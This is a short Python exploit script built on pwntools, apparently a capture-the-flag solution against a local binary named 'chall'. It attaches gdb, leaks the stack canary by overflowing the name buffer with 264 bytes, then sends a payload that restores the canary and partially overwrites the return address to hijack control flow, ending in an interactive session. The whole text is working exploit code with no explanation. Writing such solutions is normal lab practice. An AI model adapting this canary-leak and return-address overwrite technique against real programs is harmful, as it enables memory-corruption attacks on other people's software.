from pwn import *
from struct import pack

exe = ELF("./chall", checksec=False)
ropper = ROP(exe)
context.binary = exe
context.log_level = "WARNING"
context.terminal = "konsole -e".split()

def gdbDebug(exe: process):
    script = """
    # finish
    break *vuln+180
    continue
    """
    gdb.attach(exe, gdbscript=script)
    return None

def leakCanary(exe: process):
    exe.recvuntil(b"What's your name?\n")
    exe.sendline(b"A"*264)
    exe.recv(271)
    stack_canary = int.from_bytes(b"\x00" + exe.recv(7), byteorder="little")
    print("stack canary:",hex(stack_canary))
    return stack_canary

p = process()
gdbDebug(p)
stack_canary = leakCanary(p)

p.recvuntil(b"How old are you?\n")
payload = b"A"*264
payload += pack("<Q", stack_canary)
payload += b"A"*8
payload += b"\x9e"
p.send(payload)

p.recvuntil(b"What's your name?\n")
payload = b"\x00"*(264+8+8)
p.send(payload)

p.interactive()